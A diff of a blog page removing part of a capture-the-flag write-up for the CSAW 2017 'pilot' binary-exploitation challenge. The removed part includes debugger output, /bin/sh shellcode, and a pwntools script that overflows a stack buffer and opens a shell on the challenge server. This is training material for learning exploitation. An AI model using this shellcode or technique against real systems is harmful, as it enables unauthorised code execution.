-</span><span style=""></span><span style="color:#ae81ff">0x00400830</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sym.imp.__libc_start_main
-</span><span style=""></span><span style="color:#ae81ff">0x00400840</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sym.imp.__cxa_atexit
-</span><span style=""></span><span style="color:#ae81ff">0x00400850</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sub._ZNSt8ios_base4InitD1Ev_64_850
-</span><span style=""></span><span style="color:#ae81ff">0x00400860</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sub._ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc_72_860
-</span><span style=""></span><span style="color:#ae81ff">0x00400870</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sub._ZNSolsEPKv_80_870
-</span><span style=""></span><span style="color:#ae81ff">0x00400880</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sub._ZNSolsEPFRSoS_E_88_880
-</span><span style=""></span><span style="color:#ae81ff">0x00400890</span><span style="">    </span><span style="color:#ae81ff">2</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">48</span><span style="">   sub._ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__96_890
-</span><span style=""></span><span style="color:#ae81ff">0x004008a0</span><span style="">    </span><span style="color:#ae81ff">1</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">           sub.__gmon_start___248_8a0
-</span><span style=""></span><span style="color:#ae81ff">0x004008b0</span><span style="">    </span><span style="color:#ae81ff">1</span><span style=""> </span><span style="color:#ae81ff">41</span><span style="">           entry0
-</span><span style=""></span><span style="color:#ae81ff">0x004008e0</span><span style="">    </span><span style="color:#ae81ff">4</span><span style=""> </span><span style="color:#ae81ff">50</span><span style="">   </span><span style="color:#f92672">-&gt;</span><span style=""> </span><span style="color:#ae81ff">41</span><span style="">   fcn.004008e0
-</span><span style=""></span><span style="color:#ae81ff">0x004009a6</span><span style="">    </span><span style="color:#ae81ff">4</span><span style=""> </span><span style="color:#ae81ff">400</span><span style="">          main
-</span><span style=""></span><span style="color:#ae81ff">0x00400b36</span><span style="">    </span><span style="color:#ae81ff">4</span><span style=""> </span><span style="color:#ae81ff">62</span><span style="">           sub.std</span><span style="color:#f92672">::</span><span style="">ios_base</span><span style="color:#f92672">::</span><span style="">Init.Init___b36
-</span><span style=""></span><span style="">[</span><span style="color:#ae81ff">0x004008b0</span><span style="">]</span><span style="color:#f92672">&gt;</span><span style=""> </span></code></pre>
-</div>
-<p>This looks quite intimidating as the binary was stripped. <a href="https://github.com/danigargu/syms2elf">syms2elf</a> is a tool that can be used in both radare2 and IDA to add symbols back to the symbol table of the stripped binary. Without the symbols, it is harder to navigate while debugging in gdb. This makes debugging way more comfortable.
-You can rename functions before adding symbols back to the binary. To export the modified binary with symbols added: <code>$syms2elf pilot_unstripped</code>.</p>
-
-<p>Set a breakpoint at the call to <code>read@plt</code> in the main function to see where the input is written:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">pwndbg</span><span style="color:#f92672">&gt;</span><span style=""> r
-</span><span style="">Starting program</span><span style="color:#f92672">:</span><span style=""> </span><span style="color:#f92672">/</span><span style="">root</span><span style="color:#f92672">/</span><span style="">workspace</span><span style="color:#f92672">/</span><span style="">ctfs</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2017</span><span style="color:#f92672">/</span><span style="">csaw</span><span style="color:#f92672">/</span><span style="">pwn</span><span style="color:#f92672">/</span><span style="">pilot</span><span style="color:#f92672">/</span><span style="">pilot_unstripped 
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Welcome DropShip Pilot...
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">I am your assitant A.I....
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">I will be guiding you through the tutorial....
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">As a first step</span><span style="">,</span><span style=""> lets learn how to land at the designated location....
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines </span><span style="color:#f92672">&amp;</span><span style=""> Medics...
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Good Luck Pilot</span><span style="color:#f92672">!</span><span style="color:#ae81ff">.</span><span style="color:#66d9ef">...</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Location</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x7fffffffe0a0</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style="">Command</span><span style="color:#f92672">:</span><span style="">
-</span><span style="">Breakpoint </span><span style="color:#ae81ff">1</span><span style="">,</span><span style=""> </span><span style="color:#ae81ff">0x0000000000400ae0</span><span style=""> </span><span style="color:#66d9ef">in</span><span style=""> main </span><span style="">()</span><span style="">
-</span><span style="">LEGEND</span><span style="color:#f92672">:</span><span style=""> STACK </span><span style="color:#f92672">|</span><span style=""> HEAP </span><span style="color:#f92672">|</span><span style=""> CODE </span><span style="color:#f92672">|</span><span style=""> DATA </span><span style="color:#f92672">|</span><span style=""> RWX </span><span style="color:#f92672">|</span><span style=""> RODATA
-</span><span style=""></span><span style="">[</span><span style="">──────────────────────────────────────────────────────────────────REGISTERS───────────────────────────────────────────────────────────────────</span><span style="">]</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">RAX  </span><span style="color:#ae81ff">0x7fffffffe0a0</span><span style=""> —▸ </span><span style="color:#ae81ff">0x400b90</span><span style=""> ◂— push   r15
-</span><span style=""> RBX  </span><span style="color:#ae81ff">0x0</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">RCX  </span><span style="color:#ae81ff">0x7f1788dd3720</span><span style=""> </span><span style="">(</span><span style="">__write_nocancel</span><span style="color:#ae81ff">+7</span><span style="">)</span><span style=""> ◂— cmp    rax</span><span style="">,</span><span style=""> </span><span style="color:#ae81ff">-0</span><span style="">xfff
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">RDX  </span><span style="color:#ae81ff">0x40</span><span style="">
-</span><span style=""> RDI  </span><span style="color:#ae81ff">0x0</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">RSI  </span><span style="color:#ae81ff">0x7fffffffe0a0</span><span style=""> —▸ </span><span style="color:#ae81ff">0x400b90</span><span style=""> ◂— push   r15
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">R8   </span><span style="color:#ae81ff">0x7f1789091700</span><span style=""> </span><span style="">(</span><span style="">proc_file_chain_lock</span><span style="">)</span><span style=""> ◂— </span><span style="color:#ae81ff">0</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">R9   </span><span style="color:#ae81ff">0x7f1789090600</span><span style=""> </span><span style="">(</span><span style="">_IO_2_1_stdout_</span><span style="">)</span><span style=""> ◂— xchg   dword ptr </span><span style="">[</span><span style="">rax</span><span style="">],</span><span style=""> ebp </span><span style="color:#f92672">/*</span><span style=""> </span><span style="color:#ae81ff">0xfbad2887</span><span style=""> </span><span style="color:#f92672">*/</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">R10  </span><span style="color:#ae81ff">0x60d</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">R11  </span><span style="color:#ae81ff">0x246</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">R12  </span><span style="color:#ae81ff">0x4008b0</span><span style=""> </span><span style="">(</span><span style="">entry0</span><span style="">)</span><span style=""> ◂— xor    ebp</span><span style="">,</span><span style=""> ebp
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">R13  </span><span style="color:#ae81ff">0x7fffffffe1a0</span><span style=""> ◂— </span><span style="color:#ae81ff">0x1</span><span style="">
-</span><span style=""> R14  </span><span style="color:#ae81ff">0x0</span><span style="">
-</span><span style=""> R15  </span><span style="color:#ae81ff">0x0</span><span style="">
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">RBP  </span><span style="color:#ae81ff">0x7fffffffe0c0</span><span style=""> —▸ </span><span style="color:#ae81ff">0x400b90</span><span style=""> ◂— push   r15
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">RSP  </span><span style="color:#ae81ff">0x7fffffffe0a0</span><span style=""> —▸ </span><span style="color:#ae81ff">0x400b90</span><span style=""> ◂— push   r15
-</span><span style=""></span><span style="color:#f92672">*</span><span style="">RIP  </span><span style="color:#ae81ff">0x400ae0</span><span style=""> </span><span style="">(</span><span style="">main</span><span style="color:#ae81ff">+314</span><span style="">)</span><span style=""> ◂— call   </span><span style="color:#ae81ff">0x400820</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="">────────────────────────────────────────────────────────────────────DISASM────────────────────────────────────────────────────────────────────</span><span style="">]</span><span style="">
-</span><span style=""> ► </span><span style="color:#ae81ff">0x400ae0</span><span style=""> </span><span style="color:#f92672">&lt;</span><span style="">main</span><span style="color:#ae81ff">+314</span><span style="color:#f92672">&gt;</span><span style="">    call   read</span><span style="color:#f92672">@</span><span style="">plt                      </span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x400820</span><span style="color:#f92672">&gt;</span><span style="">
-</span><span style="">        fd</span><span style="color:#f92672">:</span><span style=""> </span><span style="color:#ae81ff">0x0</span><span style="">
-</span><span style="">        buf</span><span style="color:#f92672">:</span><span style=""> </span><span style="color:#ae81ff">0x7fffffffe0a0</span><span style=""> —▸ </span><span style="color:#ae81ff">0x400b90</span><span style=""> ◂— push   r15
-</span><span style="">        nbytes</span><span style="color:#f92672">:</span><span style=""> </span><span style="color:#ae81ff">0x40</span></code></pre>
-</div>
-<p>As you can see, the address of the input buffer is identical to the address printed in the output of the binary. Since the stack is executable, we only need to put shellcode onto the buffer and overwrite the return address with the address of the input buffer. I slightly modified the shellcode to extend the stack for the actual execution of the shellcode.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">   </span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">48</span><span style=""> </span><span style="color:#ae81ff">83</span><span style=""> ec </span><span style="color:#ae81ff">48</span><span style="">             sub    rsp</span><span style="">,</span><span style="color:#ae81ff">0x48</span><span style="">
-</span><span style="">   </span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">48</span><span style=""> </span><span style="color:#ae81ff">31</span><span style=""> d2                xor    rdx</span><span style="">,</span><span style="">rdx
-</span><span style="">   </span><span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">48</span><span style=""> bb ff </span><span style="color:#ae81ff">2</span><span style="">f </span><span style="color:#ae81ff">62</span><span style=""> </span><span style="color:#ae81ff">69</span><span style=""> </span><span style="color:#ae81ff">6</span><span style="">e    movabs rbx</span><span style="">,</span><span style="color:#ae81ff">0x68732f6e69622fff</span><span style="">
-</span><span style="">   e</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">2</span><span style="">f </span><span style="color:#ae81ff">73</span><span style=""> </span><span style="color:#ae81ff">68</span><span style=""> 
-</span><span style="">  </span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">48</span><span style=""> c1 eb </span><span style="color:#ae81ff">08</span><span style="">             shr    rbx</span><span style="">,</span><span style="color:#ae81ff">0x8</span><span style="">
-</span><span style="">  </span><span style="color:#ae81ff">15</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">53</span><span style="">                      push   rbx
-</span><span style="">  </span><span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">48</span><span style=""> </span><span style="color:#ae81ff">89</span><span style=""> e7                mov    rdi</span><span style="">,</span><span style="">rsp
-</span><span style="">  </span><span style="color:#ae81ff">19</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">48</span><span style=""> </span><span style="color:#ae81ff">31</span><span style=""> c0                xor    rax</span><span style="">,</span><span style="">rax
-</span><span style="">  </span><span style="color:#ae81ff">1</span><span style="color:#66d9ef">c</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">50</span><span style="">                      push   rax
-</span><span style="">  </span><span style="color:#ae81ff">1</span><span style="">d</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">57</span><span style="">                      push   rdi
-</span><span style="">  </span><span style="color:#ae81ff">1</span><span style="">e</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">48</span><span style=""> </span><span style="color:#ae81ff">89</span><span style=""> e6                mov    rsi</span><span style="">,</span><span style="">rsp
-</span><span style="">  </span><span style="color:#ae81ff">21</span><span style="color:#f92672">:</span><span style="">   b0 </span><span style="color:#ae81ff">3</span><span style="">b                   mov    al</span><span style="">,</span><span style="color:#ae81ff">0x3b</span><span style="">
-</span><span style="">  </span><span style="color:#ae81ff">23</span><span style="color:#f92672">:</span><span style="">   </span><span style="color:#ae81ff">0</span><span style="">f </span><span style="color:#ae81ff">05</span><span style="">                   syscall</span></code></pre>
-</div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span><span style=""> </span><span style="">pwn</span><span style=""> </span><span style="color:#f92672">import</span><span style=""> </span><span style="color:#f92672">*</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="">context</span><span style="color:#f92672">.</span><span style="">arch</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;amd64&#39;</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="">s</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="">remote</span><span style="">(</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;pwn.chal.csaw.io&#39;</span><span style="">,</span><span style=""> </span><span style="color:#ae81ff">8464</span><span style="">)</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="">raw_input</span><span style="">(</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;Exploit?&#39;</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">shellcode</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x83\xEC\x48\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05</span><span style="color:#e6db74">&#34;</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="">s</span><span style="color:#f92672">.</span><span style="">recvuntil</span><span style="">(</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;[*]Location:&#39;</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">leak_buffer</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="">s</span><span style="color:#f92672">.</span><span style="">recvuntil</span><span style="">(</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="">)</span><span style="color:#f92672">.</span><span style="">strip</span><span style="">()</span><span style="">
-</span><span style=""></span><span style="color:#66d9ef">print</span><span style=""> </span><span style="">leak_buffer</span><span style="">
-</span><span style=""></span><span style="">leak_buffer</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="">int</span><span style="">(</span><span style="">leak_buffer</span><span style="">,</span><span style=""> </span><span style="color:#ae81ff">16</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">s</span><span style="color:#f92672">.</span><span style="">recvuntil</span><span style="">(</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;[*]Command:&#39;</span><span style="">)</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="color:#66d9ef">print</span><span style=""> </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;Shellcode is at:&#39;</span><span style="">,</span><span style=""> </span><span style="">hex</span><span style="">(</span><span style="">leak_buffer</span><span style="">)</span><span style="">
-</span><span style="">
-</span><span style=""></span><span style="">payload</span><span style=""> </span><span style="color:#f92672">=</span><span style=""> </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;</span><span style="">
-</span><span style=""></span><span style="">payload</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">shellcode</span><span style="">
-</span><span style=""></span><span style="">payload</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span><span style=""> </span><span style="color:#f92672">*</span><span style=""> </span><span style="">(</span><span style="color:#ae81ff">40</span><span style=""> </span><span style="color:#f92672">-</span><span style=""> </span><span style="">len</span><span style="">(</span><span style="">shellcode</span><span style="">))</span><span style="">
-</span><span style=""></span><span style="">payload</span><span style=""> </span><span style="color:#f92672">+=</span><span style=""> </span><span style="">p64</span><span style="">(</span><span style="">leak_buffer</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">s</span><span style="color:#f92672">.</span><span style="">sendline</span><span style="">(</span><span style="">payload</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="">s</span><span style="color:#f92672">.</span><span style="">interactive</span><span style="">()</span><span style="">
-</span><span style=""></span><span style="">s</span><span style="color:#f92672">.</span><span style="">close</span><span style="">()</span></code></pre>
-</div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-r" data-lang="r"><span style="">➜ python exploit.py 
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">+</span><span style="">]</span><span style=""> Opening connection to pwn.chal.csaw.io on port </span><span style="color:#ae81ff">8464</span><span style="color:#f92672">:</span><span style=""> Done
-</span><span style="">Exploit</span><span style="color:#f92672">?</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">0x7ffe3cf25d80</span><span style="">
-</span><span style="">Shellcode is at</span><span style="color:#f92672">:</span><span style=""> </span><span style="color:#ae81ff">0x7ffe3cf25d80</span><span style="">
-</span><span style=""></span><span style="">[</span><span style="color:#f92672">*</span><span style="">]</span><span style=""> Switching to interactive </span><span style="color:#66d9ef">mode</span><span style="">
-</span><span style=""></span><span style="color:#f92672">$</span><span style=""> id
-</span><span style="">uid</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span><span style="">(</span><span style="">pilot</span><span style="">)</span><span style=""> gid</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span><span style="">(</span><span style="">pilot</span><span style="">)</span><span style=""> groups</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span><span style="">(</span><span style="">pilot</span><span style="">)</span><span style="">
-</span><span style=""></span><span style="color:#f92672">$</span><span style=""> whoami
-</span><span style="">pilot
-</span><span style=""></span><span style="color:#f92672">$</span><span style=""> cat flag
-</span><span style="">flag</span><span style="">{</span><span style="color:#ae81ff">1</span><span style="">nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys</span><span style="">}</span><span style="">
-</span><span style=""></span><span style="color:#f92672">$</span><span style="">  </span></code></pre>
-</div>
-  </div>
-  
-</div>
-</div>
+			
+		</div>
 
   </body>
 </html>
